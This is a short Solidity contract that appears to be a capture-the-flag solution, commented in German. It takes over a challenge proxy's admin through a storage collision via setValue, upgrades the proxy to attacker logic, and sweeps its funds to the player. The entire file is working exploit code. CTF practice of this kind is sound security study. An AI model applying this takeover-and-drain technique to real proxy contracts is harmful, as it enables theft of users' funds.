// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    function solve(Setup setup) external {
        SimpleProxy proxy = setup.proxy();

        // 1) takeover: setze proxy.admin auf diesen Solution-Contract
        // (weil upgradeTo() später von hier aus aufgerufen wird)
        uint256 payload = uint256(uint160(address(this)));
        (bool ok1,) = address(proxy).call(abi.encodeWithSignature("setValue(uint256)", payload));
        require(ok1, "takeover failed");

        // 2) upgrade (admin-only) -> klappt jetzt, weil admin == address(this)
        LogicV2 v2 = new LogicV2();
        proxy.upgradeTo(address(v2));

        // 3) sweep funds -> Auszahlung an den Player (msg.sender von solve)
        (bool ok3,) = address(proxy).call(abi.encodeWithSignature("sweep(address)", msg.sender));
        require(ok3, "sweep failed");
    }
}